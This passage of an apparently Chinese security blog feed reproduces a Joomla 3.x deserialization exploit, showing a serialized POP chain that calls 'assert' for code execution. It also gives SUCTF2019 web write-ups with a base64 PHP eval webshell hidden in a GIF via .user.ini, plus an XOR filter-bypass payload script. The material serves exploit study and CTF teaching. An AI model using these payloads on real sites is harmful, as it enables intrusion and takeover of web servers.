class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (substr($path, <span class="number">0</span>, <span class="number">2</span>) === <span class="string">'//'</span> &amp;&amp; <span class="keyword">$this</span>-&gt;userinfo === <span class="keyword">null</span> &amp;&amp; <span class="keyword">$this</span>-&gt;host === <span class="keyword">null</span> &amp;&amp; <span class="keyword">$this</span>-&gt;port === <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;path = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;path = <span class="keyword">$this</span>-&gt;replace_invalid_with_pct_encoding($path, <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~!$&amp;\'()*+,;=@/'</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;scheme !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;path = <span class="keyword">$this</span>-&gt;remove_dot_segments(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Set the query.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $query</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_query</span><span class="params">($query)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> ($query === <span class="keyword">null</span> || $query === <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;query = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;query = <span class="keyword">$this</span>-&gt;replace_invalid_with_pct_encoding($query, <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~!$&amp;\'()*+,;=:@/?'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Set the fragment.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $fragment</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_fragment</span><span class="params">($fragment)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> ($fragment === <span class="keyword">null</span> || $fragment === <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;fragment = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;fragment = <span class="keyword">$this</span>-&gt;replace_invalid_with_pct_encoding($fragment, <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~!$&amp;\'()*+,;=:@/?'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get the complete IRI</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_iri</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$iri = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;scheme !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$iri .= <span class="keyword">$this</span>-&gt;scheme . <span class="string">':'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (($authority = <span class="keyword">$this</span>-&gt;get_authority()) !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$iri .= <span class="string">'//'</span> . $authority;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;path !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$iri .= <span class="keyword">$this</span>-&gt;path;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;query !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$iri .= <span class="string">'?'</span> . <span class="keyword">$this</span>-&gt;query;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;fragment !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$iri .= <span class="string">'#'</span> . <span class="keyword">$this</span>-&gt;fragment;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($iri !== <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> $iri;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get the scheme</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_scheme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;scheme;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get the complete authority</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_authority</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$authority = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;userinfo !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$authority .= <span class="keyword">$this</span>-&gt;userinfo . <span class="string">'@'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;host !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$authority .= <span class="keyword">$this</span>-&gt;host;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;port !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$authority .= <span class="string">':'</span> . <span class="keyword">$this</span>-&gt;port;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($authority !== <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> $authority;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get the user information</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_userinfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;userinfo;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get the host</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_host</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;host;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get the port</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_port</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;port;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get the path</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_path</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get the query</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_query</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;query;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get the fragment</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_fragment</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fragment;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">purl</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$iri = <span class="keyword">new</span> SimplePie_IRI($url);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'scheme'</span> =&gt; (string) $iri-&gt;get_scheme(),</span><br><span class="line"><span class="string">'authority'</span> =&gt; (string) $iri-&gt;get_authority(),</span><br><span class="line"><span class="string">'path'</span> =&gt; (string) $iri-&gt;get_path(),</span><br><span class="line"><span class="string">'query'</span> =&gt; (string) $iri-&gt;get_query(),</span><br><span class="line"><span class="string">'fragment'</span> =&gt; (string) $iri-&gt;get_fragment()</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="string">"whoami || $m='http://yemoli.top';"</span>;</span><br><span class="line">var_dump(purl($a));</span><br></pre></td></tr></table></figure><p><code>Output</code></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">array(<span class="number">5</span>) &#123;</span><br><span class="line">  [<span class="string">"scheme"</span>]=&gt;</span><br><span class="line">  <span class="type">string</span>(<span class="number">16</span>) <span class="string">"whoami || ='http"</span></span><br><span class="line">  [<span class="string">"authority"</span>]=&gt;</span><br><span class="line">  <span class="type">string</span>(<span class="number">12</span>) <span class="string">"yemoli.top';"</span></span><br><span class="line">  [<span class="string">"path"</span>]=&gt;</span><br><span class="line">  <span class="type">string</span>(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">  [<span class="string">"query"</span>]=&gt;</span><br><span class="line">  <span class="type">string</span>(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">  [<span class="string">"fragment"</span>]=&gt;</span><br><span class="line">  <span class="type">string</span>(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>exp</code>编写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JDatabaseDriverMysqli</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> $disconnectHandlers = <span class="keyword">array</span>([<span class="string">'SimplePie'</span>,<span class="string">'init'</span>],<span class="string">'yml'</span>);</span><br><span class="line"><span class="keyword">protected</span> $connection = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">protected</span> $a;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">$m = <span class="keyword">new</span> SimplePie();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;disconnect();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">disconnect</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;connection)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;disconnectHandlers <span class="keyword">as</span> $h)</span><br><span class="line">&#123;</span><br><span class="line">call_user_func_array($h, <span class="keyword">array</span>( &amp;<span class="keyword">$this</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//mysqli_close($this-&gt;connection);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;connection = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JSimplepieFactory</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JDatabaseDriverMysql</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimplePie</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> $feed_url=<span class="string">"phpinfo()||http://yml.top"</span>;</span><br><span class="line"><span class="keyword">var</span> $javascript = <span class="number">9999</span>;</span><br><span class="line"><span class="keyword">var</span> $raw_data = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">var</span> $cache = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">var</span> $sanitize;</span><br><span class="line"><span class="keyword">var</span> $cache_name_function = <span class="string">"assert"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;sanitize = <span class="keyword">new</span> JDatabaseDriverMysql;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'used!!!'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;feed_url !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$parsed_feed_url = parse_url(<span class="keyword">$this</span>-&gt;feed_url);</span><br><span class="line"><span class="comment">// Decide whether to enable caching</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;cache &amp;&amp; $parsed_feed_url[<span class="string">'scheme'</span>] !== <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line">$cache = call_user_func(<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;cache_class, <span class="string">'create'</span>), <span class="keyword">$this</span>-&gt;cache_location, call_user_func(<span class="keyword">$this</span>-&gt;cache_name_function, <span class="keyword">$this</span>-&gt;feed_url), <span class="string">'spc'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> JDatabaseDriverMysqli;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>Output</code></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:21</span><span class="selector-pseudo">:"JDatabaseDriverMysqli"</span><span class="selector-pseudo">:3</span>:&#123;<span class="attribute">s</span>:<span class="number">21</span>:<span class="string">"*disconnectHandlers"</span>;<span class="attribute">a</span>:<span class="number">2</span>:&#123;i:<span class="number">0</span>;<span class="attribute">a</span>:<span class="number">2</span>:&#123;i:<span class="number">0</span>;<span class="attribute">s</span>:<span class="number">9</span>:<span class="string">"SimplePie"</span>;<span class="attribute">i</span>:<span class="number">1</span>;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"init"</span>;&#125;<span class="selector-tag">i</span><span class="selector-pseudo">:1</span>;<span class="selector-tag">s</span><span class="selector-pseudo">:3</span><span class="selector-pseudo">:"yml"</span>;&#125;<span class="selector-tag">s</span><span class="selector-pseudo">:13</span><span class="selector-pseudo">:"</span>*<span class="selector-tag">connection</span>";<span class="selector-tag">b</span><span class="selector-pseudo">:1</span>;<span class="selector-tag">s</span><span class="selector-pseudo">:4</span><span class="selector-pseudo">:"</span>*<span class="selector-tag">a</span>";<span class="selector-tag">N</span>;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;前段时间意大利安全研究员Alessandro Groppo 公开了joomla3.0.0-3.4.6的漏洞详情，今天借此机会复现分析一下&lt;/
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="https://yml-sec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>SUCTF2019部分web题解</title>
    <link href="https://yml-sec.top/2019/08/19/SUCTF2019%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/"/>
    <id>https://yml-sec.top/2019/08/19/SUCTF2019%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/</id>
    <published>2019-08-19T04:24:28.000Z</published>
    <updated>2019-08-19T15:20:39.296Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h1><p>题目是一个上传页面，中间件是nginx，尝试上传正常的图片返回如下结果</p><p><img src="https://i.loli.net/2019/08/19/bYqBDjaxR79t8Ul.png" alt=""></p><p>很奇怪的是路径下存在index.php，经过测试后发现改题目上传时对图片头也进行了校验，同时检验文件中是否存在&lt;?，搜索利用到这篇文章</p><p><a href="http://drops.xmd5.com/static/drops/tips-3424.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-3424.html</a></p><p>利用.user.ini的设置来解析不是php后缀的文件，同时为了绕过&lt;?的检验使用伪协议</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//.user.ini</span><br><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=<span class="string">"php://filter/convert.base64-decode/resource=12.gif"</span></span><br></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//12.gif</span></span><br><span class="line">GIF<span class="number">89</span>a<span class="number">12</span>PD<span class="number">9</span>waHAgQGV<span class="number">2</span>YWwoJF<span class="number">9</span>QT<span class="number">1</span><span class="symbol">NUW2</span>FdKTs/Pg==</span><br></pre></td></tr></table></figure><p>最后直接读flag就好</p><p><img src="https://i.loli.net/2019/08/19/QqerPExJ5jGgCLA.png" alt=""></p><h1 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h1><p>题目源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>正则过滤了绝大部分可用字符串，可以使用多个字符异或进行构造，但是直接调用函数长度明显是不够的，这里可以用GET的方式传入我们想要调用的函数，首先FUZZ出_GET</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="string">"_GET"</span></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> tar <span class="keyword">in</span> target:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">255</span>):</span><br><span class="line">        temp = <span class="number">233</span>^i</span><br><span class="line">        <span class="keyword">if</span> chr(temp) == tar:</span><br><span class="line">            payload = payload+str(hex(i))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">head = <span class="string">"%e9"</span>*<span class="number">4</span></span><br><span class="line">payload = payload.replace(<span class="string">"0x"</span>,<span class="string">"%"</span>)</span><br><span class="line">print(head+<span class="string">"^"</span>+payload)</span><br></pre></td></tr></table></figure><p>output</p><figure class="highlight 